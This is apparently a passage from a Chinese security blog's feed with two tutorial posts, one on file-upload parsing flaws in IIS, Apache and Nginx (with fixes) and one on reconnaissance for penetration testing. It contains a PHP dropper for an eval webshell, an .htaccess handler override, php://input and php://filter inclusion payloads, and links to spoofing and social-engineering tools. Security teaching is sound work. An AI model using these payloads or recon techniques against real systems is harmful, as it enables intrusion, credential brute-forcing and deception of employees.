<h4 id="IIS解析漏洞"><a href="#IIS解析漏洞" class="headerlink" title="IIS解析漏洞"></a>IIS解析漏洞</h4><h5 id="（一）IIS5-x-6-x解析漏洞"><a href="#（一）IIS5-x-6-x解析漏洞" class="headerlink" title="（一）IIS5.x-6.x解析漏洞"></a><strong>（一）IIS5.x-6.x解析漏洞</strong></h5><p>使用iis5.x-6.x版本的服务器，大多为windows server 2003，网站比较古老，开发语句一般为asp；该解析漏洞也只能解析asp文件，而不能解析aspx文件。</p>
<p><strong>目录解析(6.0)</strong></p>
<p>形式：<a href="http://www.xxx.com/xx.asp/xx.jpg">www.xxx.com/xx.asp/xx.jpg</a><br>原理: 服务器默认会把.asp，.asa目录下的文件都解析成asp文件。</p>
<p><strong>文件解析</strong></p>
<p>形式：<a href="http://www.xxx.com/xx.asp;.jpg">www.xxx.com/xx.asp;.jpg</a><br>原理：服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。</p>
<p><strong>解析文件类型</strong></p>
<p>IIS6.0 默认的可执行文件除了asp还包含这三种 :</p>
<p>/test.asa<br>/test.cer<br>/test.cdx</p>
<p><strong>修复方案</strong></p>
<p>1.目前尚无微软官方的补丁，可以通过自己编写正则，阻止上传xx.asp;.jpg类型的文件名。<br>2.做好权限设置，限制用户创建文件夹。</p>
<h4 id="（二）IIS7-x解析漏洞"><a href="#（二）IIS7-x解析漏洞" class="headerlink" title="（二）IIS7.x解析漏洞"></a>（二）IIS7.x解析漏洞</h4><p>需要把请求限制的 对勾 给去掉，才会有解析漏洞<br>192.168.0.106:8089/1.jpg/.php,这样去构造。</p>
<p><img src="/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD/3.jpg"></p>
<hr>
<h4 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h4><p><strong>漏洞原理</strong></p>
<p>　　Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断。比如 test.php.owf.rar “.owf”和”.rar” 这两种后缀是apache不可识别解析,apache就会把oldboy.php.owf.rar解析成php。</p>
<p><strong>漏洞形式</strong></p>
<p><a href="http://www.xxxx.xxx.com/test.php.php123">www.xxxx.xxx.com/test.php.php123</a></p>
<p><strong>其余配置问题导致漏洞</strong></p>
<p>（1）如果在 Apache 的 conf 里有这样一行配置 AddHandler php5-script .php 这时只要文件名里包含.php 即使文件名是 test2.php.jpg 也会以 php 来执行。<br>（2）如果在 Apache 的 conf 里有这样一行配置 AddType application/x-httpd-php .jpg 即使扩展名是 jpg，一样能以 php 方式执行。</p>
<p><strong>修复方案</strong></p>
<p>1.apache配置文件，禁止.php.这样的文件执行，配置文件里面加入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;Files ~ “.(php.|php3.)”&gt;</span><br><span class="line">        Order Allow,Deny</span><br><span class="line">        Deny from all</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure>

<p>2.用伪静态能解决这个问题，重写类似.php.*这类文件，打开apache的httpd.conf找到LoadModule rewrite_module modules/mod_rewrite.so<br>把#号去掉，重启apache,在网站根目录下建立.htaccess文件</p>
<p>代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;IfModule mod_rewrite.c&gt;</span><br><span class="line">RewriteEngine On</span><br><span class="line">RewriteRule .(php.|php3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(pHp.|pHp3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(phP.|phP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(Php.|Php3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PHp.|PHp3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PhP.|PhP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(pHP.|pHP3.) &#x2F;index.php</span><br><span class="line">RewriteRule .(PHP.|PHP3.) &#x2F;index.php</span><br><span class="line">&lt;&#x2F;IfModule&gt;</span><br><span class="line"></span><br><span class="line">.htaccess</span><br><span class="line"></span><br><span class="line">    配置文件LoadModule rewrite_module modules&#x2F;mod_rewrite.so前的注释去掉，寻找关键词：AllowOverride，并把后面的参数从None全部改成All</span><br></pre></td></tr></table></figure>



<h4 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h4><p><strong>漏洞原理</strong></p>
<p>　　Nginx默认是以CGI的方式支持PHP解析的，普遍的做法是在Nginx配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问<a href="http://www.xx.com/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6%EF%BC%8C$fastcgi_script_name%E4%BC%9A%E8%A2%AB%E8%AE%BE%E7%BD%AE%E4%B8%BA%E2%80%9Cphpinfo.jpg/1.php%E2%80%9D%EF%BC%8C%E7%84%B6%E5%90%8E%E6%9E%84%E9%80%A0%E6%88%90SCRIPT_FILENAME%E4%BC%A0%E9%80%92%E7%BB%99PHP">www.xx.com/phpinfo.jpg/1.php这个URL时，$fastcgi_script_name会被设置为“phpinfo.jpg/1.php”，然后构造成SCRIPT_FILENAME传递给PHP</a> CGI，但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢?这就要说到fix_pathinfo这个选项了。 如果开启了这个选项，那么就会触发在PHP中的如下逻辑：</p>
<p>PHP会认为SCRIPT_FILENAME是phpinfo.jpg，而1.php是PATH_INFO，所以就会将phpinfo.jpg作为PHP文件来解析了</p>
<p><strong>漏洞形式</strong></p>
<p><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/1.php">www.xxxx.com/UploadFiles/image/1.jpg/1.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg%00.php">www.xxxx.com/UploadFiles/image/1.jpg%00.php</a><br><a href="http://www.xxxx.com/UploadFiles/image/1.jpg/%20/0.php">www.xxxx.com/UploadFiles/image/1.jpg/%20\0.php</a></p>
<p>xxx.jpg%00.php (Nginx &lt;8.03 空字节代码执行漏洞)</p>
<p>另外一种手法：上传一个名字为test.jpg，以下内容的文件。</p>
<p><code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
<p>然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。</p>
<p><strong>修复方案</strong></p>
<p>1.修改php.ini文件，将cgi.fix_pathinfo的值设置为0;<br>2.在Nginx配置文件中添加以下代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if ( $fastcgi_script_name ~ ..&#x2F;.php ) &#123;</span><br><span class="line"></span><br><span class="line">return 403;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这行代码的意思是当匹配到类似test.jpg/a.php的URL时，将返回403错误代码。</p>
<hr>
<h4 id="htaccess文件解析"><a href="#htaccess文件解析" class="headerlink" title=".htaccess文件解析"></a>.htaccess文件解析</h4><p>上传.htaccess文件 ，是将本文件夹中的所有文件用php来执行  也可以称为文件包含漏洞<br>文件内容为：</p>
<blockquote>
<p>&lt;FilesMatch “”&gt;SetHandler application/x-httpd-php</FilesMatch></p>
</blockquote>
<h4 id="本地文件包含解析"><a href="#本地文件包含解析" class="headerlink" title="本地文件包含解析"></a>本地文件包含解析</h4><p>文件包含漏洞的查找，当有源代码的时候可以直接查找，相关函数，当没有源代码的时候我们就需要手工包含别的文件来看看是否有包含漏洞。</p>
<p>文件包含有四个函数，遇到错误不会停止执行：include()、include_once()<br>                                    遇到错误会停止执行：require()、ruquire_once()<br>                                    我们一般使用include()和include_once()</p>
<p>需要我们把allow_url_include()设置为on状态、magic_quotes_gpc为off状态</p>
<p>（1）包含漏洞一般采用图片与文件一起上传，利用包含漏洞将图片中的一句话木马给解出来。<br>（2）需要使用../来进行返回上一级目录，如果被过滤可以进行…/./进行过滤。<br>（3）如果没有发现需要进行上传的漏洞，我们可以选择选择找到日志文件进行包含获取webshell，/apache/logs/access.log目录，但是目录前面的../需要自己构造。<br>（4）文件包含读文件和写文件，这个都需要使用php协议<br>读文件：php://filter/read=convert.base64-encode/resource=     （使用base64加密防止报错）<br>写文件：php://input   在post中提交<?php system('net user')?><br>（5）str_replace()函数，可以将http、https、../、..\都替换为空或删除。<br>我们需要使用ht<a href="http://tp//%E5%92%8C.../%E8%BF%9B%E8%A1%8C%E7%BB%95%E8%BF%87%EF%BC%8C%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%8F%AF%E4%BB%A5%E4%B8%8D%E4%BC%9A%E5%8F%97%E5%BD%B1%E5%93%8D%E3%80%82">http://tp://和..././进行绕过，绝对路径也可以不会受影响。</a><br>（6）fnmatch()函数，只允许include和file头进行访问<br>我们可以使用file协议file://c:1.txt 这里绝对路径和../都支持。一般企业都使用这个函数进行过滤。</p>
<h3 id="六、安全防范"><a href="#六、安全防范" class="headerlink" title="六、安全防范"></a>六、安全防范</h3><p>​      针对文件上传漏洞的特点和必须具备的三个条件，我们阻断任何一个条件就可以达到组织文件上传攻击的目的：</p>
<p>1、最有效的，将文件上传目录直接设置为不可执行，对于Linux而言，撤销其目录的’x’权限；实际中很多大型网站的上传应用都会放置在独立的存储上作为静态文件处理，一是方便使用缓存加速降低能耗，二是杜绝了脚本执行的可能性；</p>
<p>2、文件类型检查：强烈推荐白名单方式，结合MIME Type、后缀检查等方式（即只允许允许的文件类型进行上传）；此外对于图片的处理可以使用压缩函数或resize函数，处理图片的同时破坏其包含的HTML代码；</p>
<p>3、使用随机数改写文件名和文件路径，使得用户不能轻易访问自己上传的文件；</p>
<p>4、单独设置文件服务器的域名；</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2019/09/30/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a><strong>信息收集</strong></h1><h2 id="1-1-第一步-域名探测"><a href="#1-1-第一步-域名探测" class="headerlink" title="1.1 第一步 域名探测"></a>1.1 <strong>第一步 域名探测</strong></h2><p>​    当我们要对一个站点进行渗透测试之前，一般渗透测试人员常见方法是直接通漏洞扫描器来对指定目标站点进行渗透，当指定的目标站点无漏洞情况，渗透测试员就需要进行信息收集工作来完成后期的渗透。</p>
<p>​    目前一般域名漏洞扫描工具有AWVS、APPSCAN、Netspark、WebInspect、Nmap、Nessus、天镜、明鉴、WVSS、RSAS等，后面会分开给大家讲解。</p>
<h2 id="1-2-第二步-子域名探测"><a href="#1-2-第二步-子域名探测" class="headerlink" title="1.2 第二步 子域名探测"></a>1.2 <strong>第二步 子域名探测</strong></h2><p>根据主域名，可以获取二级域名、三级域名、……主要姿势可以有：</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps1.jpg" alt="img"> </p>
<p><strong>【1】DNS域传送漏洞（不得不称赞）</strong></p>
<p>​       如果存在，不仅能搜集子域名，还能轻松找到一枚洞，这样子的好事百试不厌。如果SRC一级域名不多，直接在kali下 dnsenum oldboyedu.com 。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps2.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps3.jpg" alt="img"> </p>
<p><strong>工具说明及用法可参考如下：</strong></p>
<p>​    dnsenum的目的是尽可能收集一个域的信息，它能够通过谷歌或者字典文件猜测可能存在的域名，以及对一个网段进行反向查询。它可以查询网站的主机地址信息、域名服务器、mx record（函件交换记录），在域名服务器上执行axfr请求，通过谷歌脚本得到扩展域名信息（google hacking），提取自域名并查询，计算C类地址并执行whois查询，执行反向查询，把地址段写入文件。</p>
<p><strong>参数说明：</strong></p>
<p> -h        查看工具使用帮助</p>
<p>–dnsserver    <server>    指定域名服务器</p>
<p>–enum    快捷选项，相当于”–threads 5 -s 15 -w” </p>
<p>–noreverse    跳过反向查询操作</p>
<p>–nocolor    无彩色输出</p>
<p>–private    显示并在”domain_ips.txt”文件结尾保存私有的ips</p>
<p>–subfile <file>    写入所有有效的子域名到指定文件</p>
<p>-t, –timeout <value>     tcp或者udp的连接超时时间，默认为10s（时间单位：秒）</p>
<p>–threads <value>    查询线程数</p>
<p>-v, –verbose    显示所有的进度和错误消息</p>
<p>-o ,–output <file>    输出选项，将输出信息保存到指定文件</p>
<p>-e, –exclude    <regexp>    反向查询选项，从反向查询结果中排除与正则表达式相符的PTR记录，在排查无效主机上非常有用</p>
<p>-w, –whois    在一个C段网络地址范围提供whois查询</p>
<p>-f dns.txt 指定字典文件，可以换成 dns-big.txt 也可以自定义字典</p>
<p><strong>相关解析记录说明可参考：</strong><a href="https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html">https://wenku.baidu.com/view/d2d597b669dc5022aaea0030.html</a></p>
<p><strong>【2】备案号查询</strong></p>
<p>​       这算是奇招吧，通过查询系统域名备案号，再反查备案号相关的域名，收获颇丰。</p>
<p><strong>网站备案查询地址：<a href="http://www.beianbeian.com/">http://www.beianbeian.com</a></strong></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps4.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps5.jpg" alt="img"> </p>
<p><strong>【3】SSL证书</strong></p>
<p>​       通过查询SSL证书，获取的域名存活率很高，这应该也是不错的思路。</p>
<p>查询网址: <a href="https://myssl.com/ssl.html">https://myssl.com/ssl.html</a>  和<a href="https://www.chinassl.net/ssltools/ssl-checker.html">https://www.chinassl.net/ssltools/ssl-checker.html</a></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps6.jpg" alt="img"> </p>
<p><strong>【4】google搜索C段</strong></p>
<p>​       这招用的比较少，国内没条件的就用bing或百度吧（国内站点足矣），在没什么进展的时候或许会有意外惊喜。</p>
<p>方法一：参考GoogleHack用法</p>
<p>方法二：用k8工具，前提条件记得注册bing接口</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps7.jpg" alt="img"> </p>
<p><strong>什么是C段：</strong>比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1<del>127.127.127.255 这 1</del>255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255任何一个站 之后提权来嗅探得到127.4 这台服务器的密码 甚至3389连接的密码后台登录的密码 如果运气好会得到很多的密码…</p>
<p><strong>【5】APP提取</strong></p>
<p>​       反编译APP进行提取相关IP地址，此外在APP上挖洞的时候，可以发现前面招式找不到的域名，在APP里面有大量的接口IP和内网 IP，同时可获取不少安全漏洞。</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps8.jpg" alt="img"> </p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps9.jpg" alt="img"> </p>
<p><strong>【6】微信公众号</strong></p>
<p>​       企业的另一通道，渗透相关公众号，绝对会有意外收获：不少漏洞+域名，有关Burp如何抓取微信公众号数据可参考 Burp APP抓包。</p>
<p><strong>【7】字典枚举法</strong></p>
<p>​       字典枚举法是一种传统查找子域名的技术，这类工具有  DNSReconcile、Layer子域名挖掘机、DirBuster等。</p>
<p><strong>【8】公开DNS源</strong></p>
<p>Rapid7下Sonar项目发布的： <a href="https://scans.io/study/sonar.fdns_v2%E3%80%82">https://scans.io/study/sonar.fdns_v2。</a></p>
<p>DNS历史解析：     <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p><strong>【9】威胁情报查询</strong></p>
<p>华为安全情报 <a href="https://isecurity.huawei.com/">https://isecurity.huawei.com</a></p>
<h2 id="1-3-第三步-敏感信息收集"><a href="#1-3-第三步-敏感信息收集" class="headerlink" title="1.3 第三步 敏感信息收集"></a>1.3 <strong>第三步 敏感信息收集</strong></h2><p><strong>【1】Web源代码泄露</strong></p>
<p>​      通过工具暴破相关Web源代码泄露，流程如下：</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps10.jpg" alt="img"> </p>
<p>​    最想强调的是github信息泄露了，直接去github上搜索，收获往往是大于付出。可能有人不自信认为没能力去SRC挖洞，可是肯定不敢说不会上网不会搜索。github相关的故事太多，但是给人引出的信息泄露远远不仅在这里：github.com、rubygems.org、pan.baidu.com…</p>
<p>QQ群备注或介绍等，甚至混入企业qq工作群…</p>
<p>​    然后说再多，也没这个好用：<a href="https://sec.xiaomi.com/article/37">https://sec.xiaomi.com/article/37</a>   全自动监控github</p>
<p><strong>信息泄露收集可能会用到如下地址：</strong></p>
<p>网盘搜索：<a href="http://www.pansou.com/%E6%88%96">http://www.pansou.com/或</a><a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a> 网盘密码破解可参考：<a href="https://www.52pojie.cn/thread-763130-1-1.html">https://www.52pojie.cn/thread-763130-1-1.html</a></p>
<p>社工信息泄露：<a href="https://www.instantcheckmate.com/%E3%80%81http://www.uneihan.com/">https://www.instantcheckmate.com/、http://www.uneihan.com/</a></p>
<p>源码搜索：<a href="https://searchcode.com/%E3%80%81">https://searchcode.com/、</a><a href="https://gitee.com/">https://gitee.com/</a>、gitcafe.com、code.csdn.net</p>
<p>钟馗之眼： <a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<p>天眼查   <a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p>
<p>其它：威胁情报：微步在线、 ti.360.cn、 Virustotal</p>
<p><strong>【2】邮箱信息收集</strong></p>
<p>​    收集邮箱信息主要有两个作用：1.通过发现目标系统账号的命名规律，可以用来后期登入其他子系统。2.爆破登入邮箱用。</p>
<p>​    通常邮箱的账号有如下几种生成规律： 比如某公司有员工名叫做“张小三”，它的邮箱可能如下：</p>
<p><a href="mailto:&#x7a;&#x68;&#97;&#x6e;&#x67;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#110;&#x40;&#x78;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;">&#x7a;&#x68;&#97;&#x6e;&#x67;&#x78;&#x69;&#97;&#111;&#115;&#x61;&#110;&#x40;&#x78;&#x78;&#x78;&#x2e;&#x63;&#111;&#109;</a>     <a href="mailto:&#120;&#x69;&#x61;&#111;&#115;&#97;&#110;&#x2e;&#x7a;&#x68;&#x61;&#110;&#103;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#111;&#x6d;">&#120;&#x69;&#x61;&#111;&#115;&#97;&#110;&#x2e;&#x7a;&#x68;&#x61;&#110;&#103;&#x40;&#120;&#x78;&#120;&#46;&#x63;&#111;&#x6d;</a>        <a href="mailto:&#122;&#120;&#x69;&#97;&#x6f;&#x73;&#x61;&#110;&#64;&#120;&#120;&#x78;&#x2e;&#99;&#111;&#x6d;">&#122;&#120;&#x69;&#97;&#x6f;&#x73;&#x61;&#110;&#64;&#120;&#120;&#x78;&#x2e;&#99;&#111;&#x6d;</a></p>
<p>​    当我们收集几个邮箱之后，便会大致猜出对方邮箱的命名规律。除了员工的邮箱之外，通过公司会有一些共有的邮箱，比如人力的邮箱、客服的邮箱，<a href="mailto:&#104;&#114;&#x40;&#x78;&#x78;&#120;&#46;&#x63;&#x6f;&#109;">&#104;&#114;&#x40;&#x78;&#x78;&#120;&#46;&#x63;&#x6f;&#109;</a>/kefu@xxx.com,这种邮箱有时会存在弱口令，在渗透时可额外留意一下。我们可以通过手工或者工具的方式来确定搜集邮箱：</p>
<p><strong>手工的方式：</strong></p>
<p>1.可以到百度等搜索引擎上搜索邮箱信息</p>
<p>2.github等第三方托管平台</p>
<p>3.社工库</p>
<p><strong>工具方式：</strong></p>
<p>​    在邮箱收集领域不得不提一个经典的工具，The Harvester,The Harvester可用于搜索Google、Bing和PGP服务器的电子邮件、主机以及子域名,因此需要翻墙运行该工具。工具下载地址为：<a href="https://github.com/laramies/theHarvester">https://github.com/laramies/theHarvester</a></p>
<p>· <strong>注：**</strong>python -m pip install -r requirements.txt**  <strong>导入相关配置，python3.6版本</strong></p>
<p>使用方式很简单：</p>
<p>   ./theHarvester.py -d 域名   -1 1000   -b all</p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps11.jpg" alt="img"> </p>
<p><strong>【3】历史漏洞收集</strong></p>
<p>​    仔细分析，大胆验证，发散思维，对企业的运维、开发习惯了解绝对是有很大的帮助。可以把漏洞保存下来，进行统计，甚至炫一点可以做成词云展示给自己看，看着看着或者就知道会有什么漏洞。</p>
<p>wooyun 历史漏洞库：<a href="http://www.anquan.us/">http://www.anquan.us/</a></p>
<p>漏洞银行：<a href="https://www.bugbank.cn/">https://www.bugbank.cn/</a></p>
<p>360补天：<a href="https://www.butian.net/">https://www.butian.net/</a></p>
<p>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p>
<p><strong>【4】工具信息收集</strong></p>
<p>如：7kbscan、破壳Web极速扫描器等</p>
<h2 id="1-4-第四步-指纹识别、Waf、CDN识别"><a href="#1-4-第四步-指纹识别、Waf、CDN识别" class="headerlink" title="1.4 第四步 指纹识别、Waf、CDN识别"></a>1.4 <strong>第四步 指纹识别、Waf、CDN识别</strong></h2><p>​     在这个过程中，可以加入端口扫描、敏感文件扫描之类的操作，工具可自由选择，如：</p>
<p>御剑WEB指纹识别系统、whatweb、Wapplyzer等工具。</p>
<p>​    1、在线识纹识别：</p>
<p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></p>
<p><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></p>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps12.jpg" alt="img"> </p>
<p>2、Waf识别</p>
<p><a href="https://github.com/EnableSecurity/wafw00f">github.com/EnableSecurity/wafw00f</a></p>
<p>3、CDN识别</p>
<p><a href="https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py">https://raw.githubusercontent.com/3xp10it/mytools/master/xcdn.py</a></p>
<h2 id="1-5-第五步-资产梳理"><a href="#1-5-第五步-资产梳理" class="headerlink" title="1.5 第五步 资产梳理"></a>1.5 <strong>第五步 资产梳理</strong></h2><p>​     有了庞大的域名，接下来就是帮助SRC梳理资产了。域名可以先判断存活，活着的继续进行确定IP环节。根据IP的分布，确定企业的公网网段。这其实是一项不小的工程，精准度比较难以拿捏。不过通过不断实战，肯定可以琢磨出一些东西，所以有人称白帽子可能会比企业的运维更了解资产信息。资产梳理过程中可能需要对相关资产漏洞进行查询、利用、发布等，可能会用到已下相关链接地址：</p>
<p><strong>SRC众测平台</strong></p>
<p>国际漏洞提交平台 <a href="https://www.hackerone.com/">https://www.hackerone.com/</a></p>
<p>BugX区块链漏洞平台 <a href="http://www.bugx.org/">http://www.bugx.org/</a></p>
<p>Gsrc瓜子src <a href="https://security.guazi.com/">https://security.guazi.com/</a></p>
<p>区块链安全响应中心 <a href="https://dvpnet.io/">https://dvpnet.io/</a></p>
<p>CNVD国家信息安全漏洞平台 <a href="http://www.cnvd.org.cn/">http://www.cnvd.org.cn/</a></p>
<p>漏洞银行：<a href="https://www.bugbank.cn/">https://www.bugbank.cn/</a></p>
<p>360补天：<a href="https://www.butian.net/">https://www.butian.net/</a></p>
<p>教育行业漏洞报告平台（Beta）<a href="https://src.edu-info.edu.cn/login/">https://src.edu-info.edu.cn/login/</a></p>
<p><strong>国内平台</strong></p>
<p>知道创宇Seebug漏洞平台 <a href="https://www.seebug.org/">https://www.seebug.org/</a></p>
<p>工控系统行业漏洞平台 <a href="http://ivd.winicssec.com/">http://ivd.winicssec.com/</a></p>
<p>打造中文最大exploit库 <a href="http://www.expku.com/">http://www.expku.com/</a></p>
<p>为数不多的漏洞管理插件收集平台 <a href="http://www.bugscan.net/source/template/vulns/">http://www.bugscan.net/source/template/vulns/</a></p>
<p>一家管理漏洞收集的平台 <a href="http://www.0daybank.org/">http://www.0daybank.org/</a></p>
<p><strong>国外平台</strong></p>
<p>国际漏洞提交平台 <a href="https://www.hackerone.com/">https://www.hackerone.com/</a></p>
<p>xss poc  <a href="http://xssor.io/">http://xssor.io/</a></p>
<p>oday漏洞库 <a href="https://www.0day.today/">https://www.0day.today/</a></p>
<p>路由器漏洞库 <a href="http://routerpwn.com/">http://routerpwn.com/</a></p>
<p>cve漏洞平台 <a href="http://cve.mitre.org/">http://cve.mitre.org/</a></p>
<p><strong>威胁情报</strong></p>
<p>安全数据交流平台   <a href="https://www.secsilo.com/">https://www.secsilo.com/</a></p>
<p>华为安全情报 <a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></p>
<p>威胁情报共享平台  <a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a></p>
<p>被黑站点统计 <a href="http://www.hacked.com.cn/">http://www.hacked.com.cn/</a></p>
<p><strong>社工库</strong></p>
<p>微信伪造  <a href="http://www.jietuyun.com/">http://www.jietuyun.com/</a></p>
<p>任意邮箱发送  <a href="http://tool.chacuo.net/mailanonymous%E5%92%8Chttps://emkei.cz/">http://tool.chacuo.net/mailanonymous和https://emkei.cz/</a></p>
<p>临时邮箱 <a href="http://www.yopmail.com/">http://www.yopmail.com/</a></p>
<p>邮箱池群 <a href="http://veryvp.com/">http://veryvp.com/</a></p>
<p>社工库 <a href="http://www.uneihan.com/">http://www.uneihan.com/</a></p>
<h2 id="1-6-G-oogleHack"><a href="#1-6-G-oogleHack" class="headerlink" title="1.6 G**oogleHack**"></a>1.6 <strong>G**</strong>oogleHack**</h2><h3 id="1-6-1-功能介绍"><a href="#1-6-1-功能介绍" class="headerlink" title="1.6.1 功能介绍"></a>1.6.1 <strong>功能介绍</strong></h3><p>​    使用<a href="http://baike.haosou.com/doc/108804.html">Google</a>等搜索引擎对某些特定的<a href="http://baike.haosou.com/doc/3663174.html">网络</a>主机漏洞（通常是服务器上的脚本漏洞）进行搜索，以达到快速找到漏洞主机或特定主机的漏洞的目的。Google毫无疑问是当今世界上最强大的搜索引擎。然而，在黑客手中，它也是一个秘密武器，它能搜索到一些你意想不到的信息。</p>
<h3 id="1-6-2-部署-指南"><a href="#1-6-2-部署-指南" class="headerlink" title="1.6.2 部署**指南**"></a>1.6.2 <strong>部署**</strong>指南**</h3><p>a) 一台可以正常访问互联网的设备（通常为PC）</p>
<p>b) 一个常用浏览器（IE、Chrome等等）</p>
<p>c) 掌握强大的搜索关键词</p>
<h3 id="1-6-3-实战"><a href="#1-6-3-实战" class="headerlink" title="1.6.3 实战"></a>1.6.3 <strong>实战</strong></h3><p>​    Google搜索引擎之所以强大，关键在于它详细的搜索关键词，以下是几个常用的搜索关键词：（更多详细教程，参见<a href="http://user.qzone.qq.com/568311803/main%EF%BC%89">http://user.qzone.qq.com/568311803/main）</a></p>
<p>​    inurl: 用于搜索网页上包含的URL. 这个语法对寻找网页上的搜索,帮助之类的很有用. </p>
<p>intext: 只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字).</p>
<p>site: 可以限制你搜索范围的域名. </p>
<p>filetype: 搜索文件的后缀或者扩展名</p>
<p>intitle: 限制你搜索的网页标题.</p>
<p>allintitle: 搜索所有关键字构成标题的网页. 但是推荐不要使用</p>
<p>link: 可以得到一个所有包含了某个指定URL的页面列表. 例如🔗<a href="http://www.google.com/">www.google.com</a> 就可以得到所有连接到Google的页面。</p>
<p><strong>一般常见用法有：</strong></p>
<p><strong>site</strong>:ooxx.com <strong>filetype</strong>:xls</p>
<p><strong>site**</strong>:xxx.xxx** <strong>admin</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>login</strong> </p>
<p><strong>site**</strong>:xxx.xxx** <strong>system</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>管理</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>登录</strong> </p>
<p><strong>site**</strong>:xxx.xxx** <strong>内部</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>系统</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>邮件</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>email</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>qq</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>群</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>企鹅</strong></p>
<p><strong>site**</strong>:xxx.xxx** <strong>腾讯</strong></p>
<p><strong>site:ooxx.com</strong></p>
<p> <strong>inurl:jmx-console</strong></p>
<p>实例：</p>
<ol>
<li><strong>intext:管理</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps13.jpg" alt="img"> </p>
<ol start="2">
<li><strong>filetype:mdb</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps14.jpg" alt="img"> </p>
<ol start="3">
<li><strong>inurl:file</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps15.jpg" alt="img"> </p>
<ol start="4">
<li><strong>site: baidu.com filetype:txt 查找TXT文件 其他的依次**</strong>类**<strong>推</strong></li>
</ol>
<p><img src="file:///C:\Users\zhangyan\AppData\Local\Temp\ksohtml20604\wps16.jpg" alt="img"> </p>
<ol start="5">
